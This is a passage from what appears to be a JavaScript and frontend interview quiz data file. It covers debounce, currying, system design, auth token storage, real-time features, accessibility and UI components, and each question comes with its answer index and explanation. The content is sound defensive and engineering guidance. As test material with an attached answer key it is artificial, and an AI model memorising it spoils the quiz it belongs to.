  { q: "How does Immer achieve immutability?", opts: ["Deep cloning everything", "Uses Proxy to let you write 'mutating' code that actually produces a new immutable copy — produce(state, draft => { draft.count++ })", "Uses Object.freeze internally", "Uses WeakMap"], correct: 1, explain: "Immer's produce() wraps state in a Proxy (draft). You write normal mutating code on draft. Immer records the changes and creates a new immutable copy. The original state is untouched. This is how Redux Toolkit's createSlice works internally." },
  { q: "Why is immutability important for React performance?", opts: ["It isn't important", "Immutability enables reference equality checks — React.memo and useMemo can compare prevProps === newProps in O(1) instead of deep equality checks", "It reduces memory usage", "It prevents re-renders entirely"], correct: 1, explain: "If you mutate state directly, the object reference stays the same — React.memo sees prevProps === newProps and skips re-render (showing stale UI). With immutability: new object = new reference = React knows something changed. This enables efficient shouldComponentUpdate and React.memo." },
],

'ji-debounce': [
  { q: "Implement debounce — what should it do?", opts: ["Call the function immediately", "Delay execution until N ms after the LAST call — resets timer on each call. Only fires once after activity stops.", "Call at most once per interval", "Queue all calls"], correct: 1, explain: "debounce(fn, 300): each call cancels the previous timer and sets a new 300ms timer. Only the final call (after 300ms of silence) executes fn. Use for: search input (fire after typing stops), form auto-save, resize handler." },
  { q: "What is the difference between debounce and throttle?", opts: ["They are identical", "Debounce: fires ONCE after activity STOPS. Throttle: fires at MOST once per interval regardless of call frequency.", "Throttle is faster", "Debounce is for clicks only"], correct: 1, explain: "Debounce: waits for silence — resets timer on each call. For: search, auto-save. Throttle: limits rate — fires immediately then ignores for N ms. For: scroll, resize, game loop. Wrong choice = too many calls (no limit) or missed updates (debounce on scroll = only fires when done scrolling)." },
  { q: "How do you implement debounce from scratch?", opts: ["Use setTimeout directly", "Store timer reference, clearTimeout on each call, setTimeout to schedule. Return a function that does this.", "Use requestAnimationFrame", "Use Proxy"], correct: 1, explain: "function debounce(fn, delay) { let timer; return function(...args) { clearTimeout(timer); timer = setTimeout(() => fn.apply(this, args), delay); }; } — store timer in closure. Each call cancels previous and reschedules. The key: clearTimeout before setTimeout." },
  { q: "What does the 'leading' option in Lodash debounce do?", opts: ["Fires before the trailing call", "Fires on the FIRST call immediately, then waits for silence before allowing another — gives instant feedback + rate limiting", "Fires in alphabetical order", "Adds a leading zero"], correct: 1, explain: "debounce(fn, 300, { leading: true }): fires immediately on first call, then suppresses calls during the 300ms window. Useful for: button that should respond instantly but prevent rapid double-clicks. Leading + trailing: fires on first call AND after silence." },
  { q: "How do you implement throttle from scratch?", opts: ["Same as debounce", "Track last run time, only execute if enough time has passed since last run", "Use setInterval", "Use requestAnimationFrame always"], correct: 1, explain: "function throttle(fn, limit) { let lastRun = 0; return function(...args) { const now = Date.now(); if (now - lastRun >= limit) { lastRun = now; fn.apply(this, args); } }; } — check elapsed time on each call. If enough time passed, run it and update lastRun." },
],

'ji-currying': [
  { q: "What is currying?", opts: ["A cooking technique in programming", "Transforming a function that takes multiple arguments into a chain of functions each taking one argument", "Partial application with all arguments", "A sorting algorithm"], correct: 1, explain: "curry(fn)(a)(b)(c) — instead of fn(a,b,c). Each call takes one argument and returns the next function until all arguments are collected. Enables partial application: const add5 = curriedAdd(5) — a reusable 'add 5 to anything' function." },
  { q: "What is the difference between currying and partial application?", opts: ["They are identical", "Currying: always unary (one arg at a time). Partial application: fix any number of arguments at once, creating a function needing fewer args.", "Partial application is currying with 2 args", "Currying is deprecated"], correct: 1, explain: "Currying: f(a)(b)(c) — strictly one argument at a time. Partial application: partial(fn, a, b)(c) — fix multiple at once. JavaScript's bind is partial application: fn.bind(null, a, b) returns a function needing only c. Libraries like Ramda support both." },
  { q: "Implement curry() that works for any arity. What's the key insight?", opts: ["Use recursion always", "Compare args.length to fn.length — if enough args collected, call fn. Otherwise return a function collecting more args.", "Use generators", "Use Proxy"], correct: 1, explain: "function curry(fn) { return function curried(...args) { if (args.length >= fn.length) return fn.apply(this, args); return function(...more) { return curried.apply(this, args.concat(more)); }; }; } — fn.length is arity. Keep collecting until we have enough." },
  { q: "What does compose(f, g, h)(x) do?", opts: ["Runs f, g, h independently", "f(g(h(x))) — applies functions right-to-left. h runs first, result passed to g, result passed to f.", "h(g(f(x)))", "Runs all functions in parallel"], correct: 1, explain: "compose applies functions right-to-left: compose(f, g, h)(x) = f(g(h(x))). Mathematical composition: (f ∘ g)(x). pipe() is the same but left-to-right: pipe(h, g, f)(x) = f(g(h(x))). pipe is more readable for data transformation pipelines." },
  { q: "What is a practical use case for currying in JavaScript?", opts: ["Only academic", "Event handlers with preset context, reusable filter/map functions, API call builders, validation rule factories", "Only in Haskell", "CSS generation"], correct: 1, explain: "Practical currying: const filterByStatus = status => items => items.filter(i => i.status === status). const getActive = filterByStatus('active'). Reuse getActive across different item lists. Or: const multiply = a => b => a * b; const double = multiply(2); const triple = multiply(3)." },
],
'sd-frontend-arch': [
  { q: "When interviewing for a system design role, what is the first thing you should do when given a problem?", opts: ["Start coding immediately", "Clarify requirements and constraints — who are the users, what scale, what devices, what are the technical constraints", "Draw a diagram", "List all technologies you know"], correct: 1, explain: "Always clarify before designing. Ask: How many users? What devices (mobile/desktop)? What are the performance requirements? What's the team size? What's already built? Designing without requirements is the #1 system design interview mistake." },
  { q: "What is the main advantage of feature-based folder structure over type-based?", opts: ["It's faster to build", "Features are colocated — all related code (component, hook, test, styles) lives together. Scales with team size: each team owns a feature folder.", "It uses less memory", "It's required by React"], correct: 1, explain: "Type-based: /components, /hooks, /utils — find one feature across 5 folders. Feature-based: /features/checkout/ contains component, hook, test, styles, types. Easier to delete features, clearer ownership, scales to large teams." },
  { q: "How do you handle shared code in a feature-based architecture?", opts: ["Duplicate it in each feature", "Promote to /shared or /common only when 3+ features use it — avoid premature abstraction", "Put everything in shared/ from the start", "Use global variables"], correct: 1, explain: "The Rule of Three: only move code to shared/ when 3+ features use it. Premature abstraction creates coupling between features. Duplication between 2 features is often better — they may diverge. Only abstract proven shared patterns." },
  { q: "What does 'vertical slicing' mean in frontend architecture?", opts: ["Splitting CSS files vertically", "Organizing code by business domain (checkout, auth, profile) rather than technical layer (components, hooks, services)", "Splitting the app by viewport", "Database partitioning concept"], correct: 1, explain: "Vertical slicing: each 'slice' owns its full stack from UI to API call. /features/checkout has its component, data fetching, state, types. Horizontal slicing: each layer owns its type (all components, all hooks). Vertical scales better with teams — each team owns their slice end to end." },
],

'sd-api-design': [
  { q: "When would you choose GraphQL over REST for a frontend?", opts: ["Always — GraphQL is better", "When clients need flexible queries (different components need different fields), reducing over-fetching is critical, or you have many client types with different data needs", "Only for mobile apps", "When REST is too slow"], correct: 1, explain: "GraphQL shines for: component-driven data fetching (each component queries exactly what it needs), multiple client types with different needs, reducing round trips. REST wins for: simple CRUD APIs, caching (HTTP cache works naturally), team familiarity, public APIs." },
  { q: "What is cursor-based pagination and why is it better than offset-based for large datasets?", opts: ["It uses a mouse cursor", "Cursor uses a stable pointer (last item ID) — handles insertions/deletions correctly. Offset skips N rows — if rows are inserted, items repeat or skip.", "Cursor is faster algorithmically", "Offset is deprecated"], correct: 1, explain: "Offset: 'skip 100, take 20' — if a new item is inserted before item 100, page 2 shows a duplicate from page 1. Cursor: 'give me 20 items after ID xyz' — stable regardless of insertions. Essential for infinite scroll feeds where data mutates." },
  { q: "What is tRPC and when would you recommend it?", opts: ["A new HTTP protocol", "End-to-end typesafe APIs without code generation — TypeScript types flow from server to client automatically. Best for full-stack TypeScript monorepos.", "A REST framework", "A GraphQL alternative for microservices"], correct: 1, explain: "tRPC: define procedures on the server in TypeScript → client gets fully typed API calls automatically. No REST endpoints, no GraphQL schemas, no codegen. Best for: TypeScript full-stack monorepos (Next.js, T3 Stack) where you control both ends. Not suitable for public APIs or non-TS backends." },
  { q: "How do you design API versioning for a large-scale frontend?", opts: ["Change URLs when anything breaks", "URL versioning (/api/v1/, /api/v2/) for major breaking changes. Header versioning for minor changes. Maintain N versions simultaneously during migration period.", "Never version APIs", "Use feature flags only"], correct: 1, explain: "URL versioning (/v1/, /v2/) is explicit and cache-friendly. Support old version while clients migrate. Deprecation timeline: announce → 6 months warning → sunset. For BFF (Backend for Frontend): the frontend team controls the API and can deploy both simultaneously." },
],

'sd-performance': [
  { q: "A page takes 8 seconds to load. What is your systematic approach to diagnose and fix it?", opts: ["Add a loading spinner", "Measure first: Lighthouse, WebPageTest, Chrome DevTools Network. Identify bottleneck: TTFB (server), render-blocking resources (CSS/JS), LCP image, JavaScript execution time. Fix the biggest bottleneck first.", "Add more servers", "Enable compression"], correct: 1, explain: "Measure → identify bottleneck → fix → measure again. Common bottlenecks: TTFB > 600ms = server/CDN issue. LCP > 2.5s = image/CSS optimization. TBT > 300ms = JavaScript. Always measure before optimizing — guessing leads to fixing the wrong thing." },
  { q: "What is a CDN and how does it improve frontend performance?", opts: ["A database solution", "Content Delivery Network — serves static assets from edge nodes geographically close to users. Reduces latency from 200ms to 20ms. Handles DDoS, reduces origin server load.", "A build tool", "A CSS framework"], correct: 1, explain: "CDN serves cached static files (JS, CSS, images) from 100+ global edge locations. User in Tokyo gets assets from Tokyo edge, not a Virginia server. Also: smart caching (content-hash filenames = infinite cache), HTTP/2 multiplexing, brotli compression, DDoS protection." },
  { q: "What are the three caching layers in a frontend system and what does each cache?", opts: ["Browser, server, database", "Browser cache (HTTP headers, SW) → CDN cache (static assets, API responses) → Server cache (Redis: session data, computed results)", "localStorage, sessionStorage, cookies", "L1, L2, L3 CPU cache"], correct: 1, explain: "Browser: HTTP Cache-Control headers cache assets client-side. Service Worker: programmable cache for offline-first apps. CDN: caches static assets and optionally API responses at edge. Server-side (Redis): caches expensive queries, session data, computed results. Each layer reduces load on the next." },
  { q: "How do you measure and budget for JavaScript performance in CI?", opts: ["Manually review PRs", "size-limit in CI with budget per bundle (e.g., main: 50KB gzipped). Lighthouse CI for Core Web Vitals regressions. Block merge if budget exceeded.", "Use console.time()", "Run performance tests monthly"], correct: 1, explain: "Bundle size budget: size-limit runs in CI, fails build if main bundle exceeds budget. Lighthouse CI: runs Lighthouse on each PR against a baseline, fails if LCP/INP/CLS regress. Both provide automated, quantitative performance gates preventing regressions from silently shipping." },
],

'sd-state-arch': [
  { q: "How do you decide where to put state in a large React application?", opts: ["Everything in Redux", "Classify the state: server state (React Query), URL state (router), form state (RHF), local UI state (useState), global client state (Zustand). Each type has the right tool.", "Everything in useState", "Use Context for everything"], correct: 1, explain: "The state classification framework: Is it server data? → React Query/SWR. Is it URL-representable? → Router params. Is it form data? → React Hook Form. Is it one component's concern? → useState. Is it shared client state? → Zustand/Context. Wrong tool for the type creates unnecessary complexity." },
  { q: "What is the 'single source of truth' principle and how does it apply to frontend state?", opts: ["All state in one Redux store", "Each piece of state has exactly ONE authoritative source. Derived state is computed, not duplicated. Prevents sync bugs where two sources disagree.", "Use a single database", "Only one component can have state"], correct: 1, explain: "Single source of truth: user object lives in React Query cache — don't copy it to Redux. Cart total is derived from cart items — don't store it separately. Syncing duplicate state is fragile and causes bugs. Derive everything possible; only store primitives that can't be derived." },
  { q: "How do you handle optimistic updates when the server request fails?", opts: ["Show success always", "Snapshot previous state before update, apply optimistic update immediately, rollback to snapshot on error, show error notification", "Never use optimistic updates", "Refresh the page"], correct: 1, explain: "Pattern: 1) Snapshot current state. 2) Apply optimistic update immediately (great UX). 3) Send API request. 4) On success: nothing (already correct). 5) On failure: restore snapshot + show error. React Query's onMutate/onError callbacks handle this pattern cleanly." },
],

'sd-auth-design': [
  { q: "What is the most secure storage strategy for JWT tokens?", opts: ["localStorage for access token", "Access token in memory (JS variable) — lost on refresh, short-lived. Refresh token in httpOnly cookie — inaccessible to JS, prevents XSS theft.", "Both in cookies", "sessionStorage for both"], correct: 1, explain: "localStorage is readable by any XSS on your page. Memory (JS variable) is safe from XSS but lost on refresh — that's fine, use the refresh token. httpOnly cookies can't be read by JS (XSS safe) but ARE sent with requests (use SameSite=Strict to prevent CSRF). This pattern is the industry standard." },
  { q: "How does refresh token rotation improve security?", opts: ["Makes tokens longer", "Each refresh token use issues a NEW refresh token and invalidates the old one. If a stolen token is reused, the legitimate user's next refresh detects the collision and revokes all sessions.", "Doubles the refresh interval", "Adds encryption"], correct: 1, explain: "Rotation: use refresh token → get new access + new refresh token + old token invalidated. If attacker steals refresh token and uses it first: legitimate user's next use hits an already-used (invalidated) token → system detects reuse → revoke all refresh tokens for this user. Automatic breach detection." },
  { q: "What is the difference between authentication and authorization?", opts: ["They are identical", "Authentication: who are you? (verify identity via password, OAuth, biometrics). Authorization: what can you do? (check permissions, roles, scopes after identity is established)", "Authorization comes before authentication", "Only applies to APIs"], correct: 1, explain: "Auth flow: authenticate first (login → get token), then authorize (check if token's user has permission for this resource). Common mistake: storing permissions client-side and trusting them without server verification. Always verify authorization server-side — client-side checks are for UX only." },
  { q: "How do you design an OAuth 2.0 flow for a frontend application?", opts: ["Send credentials directly", "Authorization Code + PKCE flow: redirect to OAuth provider → user authenticates there → provider redirects back with code → exchange code for tokens via backend → backend stores tokens and manages sessions", "Store client secret in frontend code", "Use implicit flow (deprecated)"], correct: 1, explain: "PKCE (Proof Key for Code Exchange) replaces the implicit flow. Frontend generates code_verifier and code_challenge. Exchange happens server-to-server (keeps client_secret off the client). Never store OAuth client_secret in frontend code — it's visible in source. The backend is the OAuth client." },
],

'sd-realtime': [
  { q: "How do you decide between WebSockets, SSE, and polling for a real-time feature?", opts: ["Always use WebSockets", "WebSocket: bidirectional frequent messages (chat, games, collaboration). SSE: server-to-client only (notifications, feeds, live updates). Long polling: fallback or infrequent updates. Regular polling: last resort.", "Always use polling", "SSE for everything"], correct: 1, explain: "Decision tree: Does client send frequent messages? → WebSocket. Server pushes only? → SSE (simpler, HTTP-based, auto-reconnect). Updates rare (> 30s interval)? → Long polling or polling. SSE is underused — it handles most 'real-time' needs (notifications, feeds) with much simpler infrastructure than WebSocket." },
  { q: "How do you design a presence system (who's online) at scale?", opts: ["Query database on every page load", "Client sends heartbeats every 30s. Server stores last-seen timestamp in Redis with 60s TTL. On expiry: mark offline. Read presence from Redis cache, not database. Broadcast changes via pub/sub.", "Use WebSocket for all presence", "Not possible at scale"], correct: 1, explain: "Heartbeat + Redis TTL: client heartbeats every 30s, Redis key auto-expires after 60s (missed 2 heartbeats = offline). Presence reads from Redis (< 1ms), not DB. Broadcasts: Redis pub/sub notifies connected servers when presence changes. This scales to millions of users." },
  { q: "What is operational transformation (OT) and when do you need it?", opts: ["A database technique", "An algorithm for resolving conflicting edits in collaborative real-time editing — ensures two users editing simultaneously end up with the same document regardless of network delays", "A CSS optimization", "A build tool concept"], correct: 1, explain: "When User A and User B both edit the same document simultaneously, OT resolves conflicts so both see the same result. The simpler alternative is CRDTs (Conflict-free Replicated Data Types). Google Docs uses OT. Figma uses CRDTs. For most apps, last-write-wins or optimistic locking is sufficient." },
],

'sd-design-system': [
  { q: "How do you architect design tokens for a large-scale design system?", opts: ["Hard-code all values", "Two-tier: primitive tokens (blue-500: #3b82f6) → semantic tokens (color-primary: blue-500). Components use semantic tokens. Themes only change semantic layer — primitives stay constant.", "One flat list of variables", "Separate files per component"], correct: 1, explain: "Primitive tokens: the complete palette (every color, spacing value, font size). Semantic tokens: purpose-based (color-primary, color-danger, spacing-component). Components use semantic — they're theme-agnostic. Dark mode: override semantic tokens only. Rebranding: change semantic mappings." },
  { q: "How do you handle breaking changes in a design system used by 20 teams?", opts: ["Just ship the change", "Semantic versioning + migration guides + codemod scripts + deprecation warnings + minimum 6-month migration window + Slack announcements + office hours for migration help", "Force all teams to update immediately", "Never make breaking changes"], correct: 1, explain: "Breaking change process: 1) Mark old API deprecated with console.warn pointing to new API. 2) Release new API alongside old. 3) Write codemod to auto-migrate. 4) Give teams 6+ months. 5) Track adoption metrics. 6) Sunset old API when adoption is > 95%. Codemods are the key — manual migration at 20 teams is slow." },
  { q: "What is the accessibility contract in a component library?", opts: ["Make it look good", "The library guarantees: correct ARIA roles, keyboard navigation, focus management, screen reader announcements. Consumers trust these without implementing themselves. Broken a11y = broken contract.", "Optional feature", "Only for enterprise"], correct: 1, explain: "When a library ships Button, it should guarantee: correct role, keyboard activation (Enter/Space), focus visible state, disabled state screen reader announcement. If consumers have to fix a11y themselves, the library failed. Ship accessibility as non-negotiable — breaking it is a major version bump." },
],

'sd-monitoring': [
  { q: "What is the difference between errors, logs, and metrics in frontend monitoring?", opts: ["They are the same", "Errors: exceptions and crashes with stack traces (Sentry). Logs: structured event records for debugging (user actions, state changes). Metrics: numeric measurements over time (LCP, error rate, API latency).", "Only errors matter", "Logs and metrics are backend-only"], correct: 1, explain: "Each serves a different purpose: Errors (Sentry, Bugsnag): 'What broke and where?' — stack traces, user context. Logs (Datadog, custom): 'What happened before the break?' — event trail. Metrics (Prometheus, Datadog): 'How is the system behaving over time?' — trends, dashboards, alerts." },
  { q: "What is Real User Monitoring (RUM) and why is it better than synthetic testing?", opts: ["A performance testing tool", "RUM collects performance data from actual users in production — real devices, networks, geographies. Synthetic tests run in controlled environments and miss real-world variability.", "A security tool", "A load testing technique"], correct: 1, explain: "Synthetic (Lighthouse, WebPageTest): fast, consistent, finds regressions in CI. Real limitations: your test machine, your network, your geography. RUM (Core Web Vitals from real users): shows actual P75/P90 experiences across all user segments — mobile users on 3G, users in India, etc. Both are needed." },
  { q: "How do you design a frontend error boundary strategy?", opts: ["One error boundary at root", "Granular boundaries: one per major section (header, main content, sidebar). Each shows a contextual fallback. Root boundary is a last resort. Log all errors to Sentry with component stack, user context, and release version.", "No error boundaries needed", "Error boundaries only for API calls"], correct: 1, explain: "Granular strategy: <Header /> in its own boundary — header crash doesn't kill the whole app. <ProductList /> in its own — broken list shows an error state, checkout still works. Root boundary: last resort showing a full-page error. Each boundary logs to Sentry with onError callback." },
],

'sd-accessibility': [
  { q: "How do you implement an accessibility strategy for a large engineering organization?", opts: ["One developer owns accessibility", "Shift left: automated tests in CI (axe-core in Jest/Cypress), component library owns a11y contract, accessibility reviews in design phase, quarterly manual audits, a11y champions per team.", "Only test before release", "Hire an accessibility consultant once"], correct: 1, explain: "Strategy layers: 1) Automated (catches ~40%): axe in unit/E2E tests, Lighthouse CI. 2) Component library (catches another ~30%): library guarantees ARIA patterns, keyboard nav. 3) Manual reviews (catches remaining ~30%): keyboard testing, screen reader testing, user testing with disabled users." },
  { q: "What WCAG level should most production applications target?", opts: ["Level A only", "WCAG 2.1 Level AA — required by ADA, EU Web Accessibility Directive, and most enterprise contracts. Level AAA for critical public services.", "Level AAA always", "WCAG is optional"], correct: 1, explain: "WCAG 2.1 AA is the legal standard in most jurisdictions (ADA lawsuits use it, EU directive requires it, government contracts specify it). AA covers the most impactful requirements: contrast ratios, keyboard accessibility, form labels, error identification. AAA is aspirational for most apps." },
  { q: "How do you measure the accessibility health of a large application?", opts: ["Run Lighthouse once a year", "Automated dashboard: axe scan of all pages weekly, Lighthouse CI on every PR, accessibility issue backlog tracked in Jira, WCAG compliance percentage tracked over time, user support tickets tagged for a11y.", "Manual testing only", "Ask if it feels accessible"], correct: 1, explain: "Quantitative a11y health: automated axe scans give you issue count and severity. Track: total violations, violations per page, critical violations (show-stoppers), WCAG criterion coverage. Trend over time shows if the team is improving. Pair with quarterly manual testing for qualitative insight." },
],

'sd-interview-tips': [
  { q: "How should you structure a system design answer?", opts: ["Jump to the solution", "1) Clarify requirements (2 min). 2) Define scope and constraints. 3) High-level design. 4) Deep dive on critical components. 5) Address trade-offs. 6) Discuss scaling challenges.", "List all technologies", "Draw the architecture immediately"], correct: 1, explain: "Structured approach: Clarify → Scope → High-level → Deep dive → Trade-offs. Interviewers want to see your PROCESS not just your answer. Jumping to a solution without clarifying shows you don't think about requirements. Every real system starts with clarification." },
  { q: "What do interviewers look for in a frontend system design interview?", opts: ["Knowledge of every technology", "Structured thinking, trade-off awareness, asking clarifying questions, considering performance/security/accessibility/scalability proactively, knowing when to use what and why", "The most complex architecture", "Speed of answering"], correct: 1, explain: "Interviewers assess: Can you break down a vague problem? Do you consider non-functional requirements (performance, a11y, security)? Do you explain trade-offs or just name technologies? Do you know when NOT to use something? Can you communicate a technical vision clearly?" },
  { q: "What is a common mistake in frontend system design interviews?", opts: ["Using React", "Jumping to implementation details too quickly without establishing requirements, OR designing at too high a level without any technical depth. Both extremes signal poor system thinking.", "Mentioning performance", "Asking clarifying questions"], correct: 1, explain: "Two failure modes: Too detailed too fast (talking about component folder structure when they want architecture) — shows inability to think at the right level. Too abstract throughout (never getting to specifics) — shows inability to implement. Navigate between levels: start high, dive deep when asked." },
  { q: "How do you handle a system design question you've never seen before?", opts: ["Say you don't know", "Apply fundamentals: clarify requirements, identify core user flows, choose the appropriate rendering strategy, identify state management needs, consider performance bottlenecks, address security concerns — these apply universally.", "Ask to skip it", "Guess randomly"], correct: 1, explain: "Every frontend system has the same concerns: Who uses it? (requirements) → How is it rendered? (SSR/CSR/SSG) → How is data fetched? (REST/GraphQL, caching) → How is state managed? (server/client state) → How does it perform? (bundles, images) → Is it secure and accessible? This framework applies to any problem." },
],
'mc-autocomplete': [
  { q: "A user types 'react' quickly (5 keystrokes). Without debounce, how many API calls fire?", opts: ["1", "5 — one per keystroke", "0", "2"], correct: 1, explain: "Without debounce, every keystroke fires a fetch. With debounce(fn, 300), each keystroke resets the timer — only one API call fires after 300ms of silence." },
  { q: "What race condition must autocomplete handle?", opts: ["Two users typing at once", "Older response arriving after newer one — 'rea' response overwrites 'react' results", "API rate limiting", "Keyboard debounce conflicts"], correct: 1, explain: "User types fast: requests fire for 'r', 're', 'rea', 'reac', 'react'. If 'rea' response arrives last, it shows wrong results. Fix: AbortController cancels previous request on each new keystroke." },
  { q: "Which ARIA attributes make an autocomplete accessible?", opts: ["aria-hidden on the list", "role='combobox' on input, role='listbox' on list, aria-activedescendant pointing to highlighted option", "tabIndex on each option", "aria-disabled when loading"], correct: 1, explain: "ARIA combobox pattern: input has role='combobox' + aria-expanded + aria-activedescendant. List has role='listbox'. Each option has role='option' + aria-selected. Screen readers announce selected option as user navigates." },
  { q: "What keyboard interactions must a compliant autocomplete support?", opts: ["Tab only", "ArrowDown/Up to navigate, Enter to select, Escape to close, Tab to move focus away", "Click only", "Enter to open, any key to close"], correct: 1, explain: "ARIA APG autocomplete pattern: ArrowDown opens list and moves highlight down, ArrowUp moves up, Enter selects highlighted, Escape closes without selecting, Tab moves focus away (and closes). Home/End jump to first/last." },
  { q: "How do you highlight matching text in autocomplete results?", opts: ["CSS bold on the whole option", "Split option text around matched substring, wrap matched portion in <mark> or <strong>", "Change font color", "Use background-color on the option"], correct: 1, explain: "Split: 'react hooks' matching 'react' → ['', 'react', ' hooks']. Wrap matched part: <span>react</span>. Never use dangerouslySetInnerHTML with user input — build the JSX programmatically to avoid XSS." },
],

'mc-infinite-scroll': [
  { q: "What browser API detects when an element enters the viewport for infinite scroll?", opts: ["scroll event listener", "IntersectionObserver — fires callback when target element enters/exits viewport without blocking the main thread", "getBoundingClientRect in setTimeout", "ResizeObserver"], correct: 1, explain: "IntersectionObserver is the correct API. It runs off-main-thread and fires when the observed element intersects the root (viewport). Place a sentinel div at the bottom of the list — when it appears, load more items." },
  { q: "What is the sentinel element pattern?", opts: ["A loading spinner component", "An invisible div at the bottom of the list that triggers data fetching when it enters the viewport", "A placeholder for missing items", "A boundary component for errors"], correct: 1, explain: "Place <div ref={sentinelRef} /> after the last list item. IntersectionObserver watches it. When it becomes visible (user scrolled to bottom), fire the next page fetch. Much cleaner than calculating scroll position manually." },
  { q: "How do you prevent duplicate fetches when IntersectionObserver fires multiple times?", opts: ["Use setTimeout", "Check isLoading or isFetching state — only fetch if not already loading", "Disconnect the observer immediately", "Use a ref flag"], correct: 1, explain: "Guard with: if (isLoading || !hasNextPage) return; inside the IntersectionObserver callback. Also common: use a useRef loading flag that can't cause re-renders, or disconnect/reconnect the observer around fetches." },
  { q: "What must you clean up when using IntersectionObserver in useEffect?", opts: ["The scroll event", "observer.disconnect() — prevents memory leaks when the component unmounts", "The sentinel ref", "The pagination state"], correct: 1, explain: "useEffect cleanup: return () => { if (observer) observer.disconnect(); }. Without disconnect, the observer continues watching a DOM element that no longer exists, causing memory leaks and potential errors." },
  { q: "How do you handle errors in infinite scroll without losing already-loaded items?", opts: ["Reset to page 1", "Show an error message below existing items with a 'Retry' button — preserve all loaded data", "Show full page error", "Reload the page"], correct: 1, explain: "Never clear existing items on error. Keep all loaded data visible, show an error notice at the bottom: 'Failed to load more. [Retry]'. On retry, attempt the same page number again. This is the Netflix/Twitter pattern." },
],

'mc-modal': [
  { q: "Why use React Portal for modals?", opts: ["Better performance", "Modals rendered inside deeply nested components inherit CSS like overflow:hidden or z-index — portaling to document.body escapes these constraints", "Easier animations", "Required for accessibility"], correct: 1, explain: "A modal inside <div style={{overflow:'hidden'}}> would be clipped. Portal renders the modal DOM inside document.body, outside any CSS constraints. React event bubbling still works through the React tree — both DOM position and React tree are independent." },
  { q: "What is focus trapping and why do modals require it?", opts: ["Preventing users from typing", "Keeping Tab/Shift+Tab cycling within the modal — prevents keyboard users from reaching content behind the modal", "Disabling all keyboard input", "Focusing the first button automatically"], correct: 1, explain: "Without focus trap, keyboard users Tab out of the modal into background content — the modal is visually blocking but not keyboard-blocking. Trap focus: when Tab is pressed on last focusable element, move to first; Shift+Tab on first → last." },
  { q: "What keyboard events should close a modal?", opts: ["Tab key", "Escape key — universal convention for dismissing overlays, dialogs, and popups", "Enter key", "Space key"], correct: 1, explain: "Escape is the standard key for closing modals (ARIA authoring practices). Also close on backdrop click (if dismissible). On close, return focus to the element that triggered the modal — don't let focus be lost." },
  { q: "What ARIA attributes does an accessible modal require?", opts: ["aria-hidden='true'", "role='dialog', aria-modal='true', aria-labelledby pointing to modal title, aria-describedby for modal content", "role='alert'", "aria-live='polite'"], correct: 1, explain: "Modal requirements: role='dialog' (announces as dialog), aria-modal='true' (tells screen readers background is inert), aria-labelledby='modal-title-id' (screen reader reads title on open), tabIndex='-1' on the container so it can receive programmatic focus." },
  { q: "How do you prevent page scroll when a modal is open?", opts: ["height: 100vh on modal", "Add overflow: hidden to document.body while modal is open, remove on close", "position: fixed on modal", "overflow: hidden on the modal itself"], correct: 1, explain: "document.body.style.overflow = 'hidden' prevents scrolling behind the modal. Clean up in useEffect: return () => { document.body.style.overflow = '' }. Also save scroll position before opening to restore it correctly on close." },
],

'mc-usefetch': [
  { q: "What are the three states every useFetch hook must expose?", opts: ["start, loading, complete", "data (successful response), loading (request in flight), error (failed request)", "pending, resolved, rejected", "idle, busy, done"], correct: 1, explain: "Every async operation has three possible states. Expose all three: { data, loading, error }. Initialize data as null, loading as true, error as null. Set loading false in both success and error paths — forget this and the spinner never stops." },
  { q: "Why is AbortController critical in useFetch?", opts: ["It makes requests faster", "Cancels in-flight requests when the component unmounts or URL changes — prevents state updates after unmount and race conditions", "Required by the fetch spec", "Improves error handling"], correct: 1, explain: "Without AbortController: user navigates away mid-fetch → response arrives → setState called on unmounted component (logic bug). Or: URL changes → old response arrives after new one → stale data shown. Return cleanup: () => controller.abort() from useEffect." },
  { q: "A user navigates from /users/1 to /users/2 quickly. What bug occurs without cleanup?", opts: ["No bug — React handles this", "Race condition: /users/1 response arrives after /users/2 response, showing wrong user data", "Double render", "Memory leak only"], correct: 1, explain: "Both fetches are in-flight. /users/2 may respond first, then /users/1 arrives and overwrites. Without AbortController cleanup, the stale /users/1 response wins. With cleanup: navigating to /users/2 aborts the /users/1 fetch immediately." },
  { q: "How do you implement retry logic in useFetch?", opts: ["Wrap in try/catch", "Track retryCount in state/ref, on error increment it (up to maxRetries), useEffect dependency on retryCount triggers re-fetch", "Use setTimeout manually", "Call the hook multiple times"], correct: 1, explain: "const [retryCount, setRetryCount] = useState(0). In the error path: if (retryCount < maxRetries) setRetryCount(c => c+1). Add retryCount to useEffect deps — incrementing it triggers a re-fetch. Expose a refetch() function: () => setRetryCount(c => c+1)." },
  { q: "Should useFetch cache responses? What is the trade-off?", opts: ["Never — always fresh", "Optional: a useRef Map cache gives instant repeat fetches at the cost of stale data. Clear cache on component unmount or use React Query instead.", "Always — mandatory for performance", "Only for GET requests"], correct: 1, explain: "Simple cache: const cache = useRef(new Map()). Check cache before fetching, store response after. Trade-off: cached data may be stale. For production, React Query/SWR handle this properly with stale-while-revalidate, TTL, and invalidation. DIY cache is appropriate for interview demos." },
],

'mc-virtual-list': [
  { q: "What problem does virtual scrolling solve?", opts: ["Slow network requests", "Rendering 10,000 DOM nodes causes browser jank — virtual scrolling renders only ~20 visible items regardless of total list size", "CSS performance", "Memory leaks in event handlers"], correct: 1, explain: "Each DOM node has memory cost, style recalculation cost, and paint cost. A 10,000-item list = 10,000 DOM nodes = seconds of rendering. Virtual scrolling maintains a fixed DOM window (~20-30 items) that moves as the user scrolls." },
  { q: "What CSS technique makes virtual scrolling work?", opts: ["display: none for hidden items", "A container with total list height, items absolutely positioned with top = index × itemHeight", "overflow: hidden on container", "transform: translateY on each item"], correct: 1, explain: "Container: height = totalItems × itemHeight (correct scrollbar). Each visible item: position: absolute; top: index × itemHeight. As user scrolls, recalculate which items are visible and update their content. Scrollbar behaves as if all items exist." },
  { q: "What is 'overscan' in virtual scrolling?", opts: ["Scanning beyond the viewport size limit", "Rendering a buffer of items above and below the visible area to prevent blank flashes during fast scrolling", "Overriding scroll behavior", "Pre-fetching data for upcoming items"], correct: 1, explain: "Without overscan: fast scrolling can outpace rendering, showing blank areas. Overscan renders 3-5 extra items above and below the viewport. User sees them as they scroll into view — eliminates blank flash. TanStack Virtual defaults to overscan: 3." },
